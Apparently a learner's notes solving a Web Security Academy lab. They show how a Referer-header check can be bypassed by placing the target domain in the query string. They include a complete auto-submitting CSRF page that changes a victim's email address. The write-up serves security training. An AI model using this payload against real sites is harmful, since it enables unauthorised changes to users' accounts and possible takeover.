```bash

1. login
2. update: email  &&  send this request to the repeater tab
3. remove: referer header
	         RESPONSE  -- Invalid referer header
	         
TEST CASE
a. add sub-domain to the referer header  --  302 Found
b. add a domain in place of sub-domain
   Referer: https://google.com/?lab-id.web-security-academy.net/my-account?id=wiener  --  302 Found
   
4. generate CSRF Poc  --  update email value
5. add: Referrer-Policy: unsafe-url

CSRF PAYLOAD

<!DOCTYPE html>
<html lang="en">
<head><meta name="referrer" content="unsafe-url"></head>
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="apple@mail.com">
			<input type="submit" value="Submit Request">
		</form>
		<script>
		  history.pushState('', '', '/?lab-id.web-security-academy.net/my-account')
		  document.forms[0].submit();
		</script>
	</body>
</html>

6. deliver to the victim and done
7. NOTE if you viewed the exploit then update the email value

```
